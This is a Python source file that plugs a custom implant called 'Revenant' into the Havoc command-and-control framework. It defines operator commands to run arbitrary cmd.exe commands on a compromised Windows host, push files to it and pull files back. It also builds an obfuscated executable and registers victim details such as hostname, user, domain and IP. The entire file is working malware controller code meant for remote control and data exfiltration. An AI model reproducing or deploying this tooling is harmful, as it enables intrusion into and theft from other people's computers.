import subprocess
import glob

from base64 import b64decode
from havoc.service import HavocService
from havoc.agent import *

COMMAND_REGISTER: int = 0x100
COMMAND_GET_JOB: int = 0x101
COMMAND_NO_JOB: int = 0x102
COMMAND_SHELL: int = 0x152
COMMAND_UPLOAD: int = 0x153
COMMAND_DOWNLOAD: int = 0x154
COMMAND_EXIT: int = 0x155
COMMAND_OUTPUT: int = 0x200


def process_config_h(config: dict):
    config_user_agent:         str = config['Options']['Listener']['UserAgent']
    config_host_bind:          str = config['Options']['Listener']['HostBind']
    config_host_port:          str = config['Options']['Listener']['Port']
    config_host_secure:        str = str(config['Options']['Listener']['Secure']).upper()
    config_sleep:              str = config['Config']['Sleep']
    #config_unmap:              str = str(config['Config']['Unmap'])
    config_poly:               str = str(config['Config']['Poly Obf'])
    config_obf_strings:        str = str(config['Config']['Obf Strings'])

    header_file = f'''\
#define CONFIG_USER_AGENT L"{config_user_agent}"
#define CONFIG_HOST L"{config_host_bind}"
#define CONFIG_PORT {config_host_port}
#define CONFIG_SECURE {str(config_host_secure).upper()}
#define CONFIG_SLEEP {config_sleep} 
#define CONFIG_POLY {str(config_poly).upper()}  
#define CONFIG_OBF_STRINGS {str(config_obf_strings).upper()}  
    ''' ##define CONFIG_UNMAP {str(config_unmap).upper()}

    for filepath in glob.iglob('**/Config.h', recursive=True):
        with open(filepath, 'w') as f:
            f.write(header_file)


class CommandShell(Command):
    def __init__(self):
        self.CommandId: int = COMMAND_SHELL
        self.Name: str = "shell"
        self.Description: str = "executes command using cmd.exe"
        self.Help: str = ""
        self.NeedAdmin: bool = False
        self.Mitr: list = []
        self.Params: list = [
            CommandParam(
                name="commands",
                is_file_path=False,
                is_optional=False
            )
        ]

    def job_generate(self, arguments: dict) -> bytes:
        Task: Packer = Packer()
        Task.add_int(self.CommandId)
        Task.add_data("c:\\windows\\system32\\cmd.exe /c " + arguments['commands'])
        return Task.buffer


class CommandUpload(Command):
    def __init__(self):
        self.CommandId: int = COMMAND_UPLOAD
        self.Name: str = "upload"
        self.Description: str = "uploads a file to the host"
        self.Help: str = ""
        self.NeedAdmin: bool = False
        self.Mitr: list = []
        self.Params: list = [
            CommandParam(
                name="local_file",
                is_file_path=True,
                is_optional=False
            ),
            CommandParam(
                name="remote_file",
                is_file_path=False,
                is_optional=False
            )
        ]

    def job_generate(self, arguments: dict) -> bytes:
        Task: Packer = Packer()
        remote_file: str = arguments['remote_file']
        filedata = b64decode(arguments['local_file']).decode()
        Task.add_int(self.CommandId)
        Task.add_data(remote_file)
        Task.add_data(filedata)
        return Task.buffer


class CommandDownload(Command):
    def __init__(self):
        self.CommandId: int = COMMAND_DOWNLOAD
        self.Name: str = "download"
        self.Description: str = "downloads the requested file"
        self.Help: str = ""
        self.NeedAdmin: bool = False
        self.Mitr: list = []
        self.Params: list = [
            CommandParam(
                name="remote_file",
                is_file_path=False,
                is_optional=False
            ),
        ]

    def job_generate(self, arguments: dict) -> bytes:
        Task: Packer = Packer()
        remote_file: str = arguments['remote_file']
        Task.add_int(self.CommandId)
        Task.add_data(remote_file)
        return Task.buffer


class CommandExit(Command):
    def __init__(self):
        self.CommandId: int = COMMAND_EXIT
        self.Name: str = "exit"
        self.Description: str = "tells agent to exit"
        self.Help: str = ""
        self.NeedAdmin: bool = False
        self.Mitr: list = []
        self.Params: list = []

    def job_generate(self, arguments: dict) -> bytes:
        Task: Packer = Packer()
        Task.add_int(self.CommandId)
        return Task.buffer


class Revenant(AgentType):
    def __init__(self):
        self.Name: str = "Revenant"
        self.Author: str = "0xTriboulet for Malicious Group"
        self.Version: str = "0.1"
        self.Description: str = "Revenant Agent Testing"
        self.MagicValue = 0x72766e74

        self.Arch: list = ["x64", "x86"]
        self.Formats: list = [
            {"Name": "Windows Exe", "Extension": "exe"},
            {"Name": "Windows DLL", "Extension": "dll"}   # Not supported yet
        ]
        self.BuildingConfig: dict = {
            "Sleep": "10",
            #"Unmap": True,
            "Poly Obf": True,
            "Obf Strings":True
        }
        self.Commands: list = [
            CommandShell(),
            CommandUpload(),
            CommandDownload(),
            CommandExit()
        ]

    def generate(self, config: dict) -> None:
        print(f"[*] Building Revenant Agent {self.Version}")
        # print(f"config: {config}")

        self.builder_send_message(config['ClientID'], "Info", f"hello from service builder")
        self.builder_send_message(config['ClientID'], "Info", f"Options Config: {config['Options']}")
        self.builder_send_message(config['ClientID'], "Info", f"Agent Config: {config['Config']}")

        # parse options from self
        print(f"[*] Revenant Magic Value {self.MagicValue}")

        print("[*] Configuring Config.h header...")
        process_config_h(config)
        compile_command: str = "cd ./Agent && make"

        try:
            process = subprocess.run(compile_command,
                                     shell=True,
                                     check=True,
                                     stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE,
                                     universal_newlines=True)
            print(process.stdout)
        except subprocess.CalledProcessError as error:
            print(f"Error occurred: {error.stderr}")
            return

        data = open("./Agent/Bin/Revenant.exe", "rb").read()

        # Below line sends the build executable back to Havoc for file management - 0xtriboulet
        self.builder_send_payload(config['ClientID'], self.Name + "." + self.Formats[0]["Extension"], data)

    def response(self, response: dict) -> bytes:

        agent_header: dict = response["AgentHeader"]
        agent_response = b64decode(response["Response"])
        response_parser = Parser(agent_response, len(agent_response))
        Command: int = response_parser.parse_int()

        if response["Agent"] is None:
            if Command == COMMAND_REGISTER:
                print("[*] Is agent register request")

                registerinfo = {
                    "AgentID": response_parser.parse_int(),
                    "Hostname": response_parser.parse_str(),
                    "Username": response_parser.parse_str(),
                    "Domain": response_parser.parse_str(),
                    "InternalIP": response_parser.parse_str(),
                    "Process Path": response_parser.parse_str(),
                    "Process ID": str(response_parser.parse_int()),
                    "Process Parent ID": str(response_parser.parse_int()),
                    "Process Arch": response_parser.parse_int(),
                    "Process Elevated": response_parser.parse_int(),
                    "OS Build": "{0}.{1}.{2}.{3}.{4}".format(str(response_parser.parse_int()),
                                                             str(response_parser.parse_int()),
                                                             str(response_parser.parse_int()),
                                                             str(response_parser.parse_int()),
                                                             str(response_parser.parse_int())),
                    "OS Arch": response_parser.parse_int(),
                    "Sleep": response_parser.parse_int(),
                }

                registerinfo["Process Name"] = registerinfo["Process Path"].split("\\")[-1]
                registerinfo["OS Version"] = registerinfo["OS Build"]

                os_arch_map = {
                    0: "x86",
                    9: "x64/AMD64",
                    5: "ARM",
                    12: "ARM64",
                    6: "Itanium-based"
                }

                registerinfo["OS Arch"] = os_arch_map.get(
                    registerinfo["OS Arch"],
                    "Unknown (" + str(registerinfo["OS Arch"]) + ")")

                proc_arch_map = {
                    0: "Unknown",
                    1: "x86",
                    2: "x64",
                    3: "IA64"
                }

                registerinfo["Process Arch"] = proc_arch_map.get(
                    registerinfo["Process Arch"],
                    "Unknown (" + str(registerinfo["Process Arch"]) + ")")

                self.register(agent_header, registerinfo)
                return registerinfo['AgentID'].to_bytes(4, 'little')  # return the agent id to the agent
            else:
                print("[-] Is not agent register request")
        else:
            print(f"[*] Something else: {Command}")
            agentid = response["Agent"]["NameID"]
            if Command == COMMAND_GET_JOB:
                print("[*] Get list of jobs and return it.")
                Tasks = self.get_task_queue(response["Agent"])

                if len(Tasks) == 0:
                    Tasks = COMMAND_NO_JOB.to_bytes(4, 'little')

                print(f"Tasks: {Tasks.hex()}")
                return Tasks

            elif Command == COMMAND_OUTPUT:
                output = response_parser.parse_str()
                print("[*] Output: \n" + output)
                self.console_message(agentid, "Good", "Received Output:", output)
            elif Command == COMMAND_UPLOAD:
                filesize = response_parser.parse_int()
                filename = response_parser.parse_str()
                self.console_message(agentid, "Good", f"File was uploaded: {filename} ({filesize} bytes)", "")
            elif Command == COMMAND_DOWNLOAD:
                filename = response_parser.parse_str()
                filecontent = response_parser.parse_str()
                self.console_message(agentid, "Good", f"File was downloaded: {filename} ({len(filecontent)} bytes)", "")
                self.download_file(agentid, filename, len(filecontent), filecontent)
            else:
                self.console_message(agentid, "Error", "Command not found: %4x" % Command, "")

        return b''


def main():
    havoc_revenant: Revenant = Revenant()

    print("[*] Connect to Havoc service api")
    havoc_service = HavocService(
        endpoint="ws://127.0.0.1:40056/service-endpoint",
        password="service-password"
    )

    print("[*] Register Revenant to Havoc")
    havoc_service.register_agent(havoc_revenant)

    return


if __name__ == '__main__':
    main()
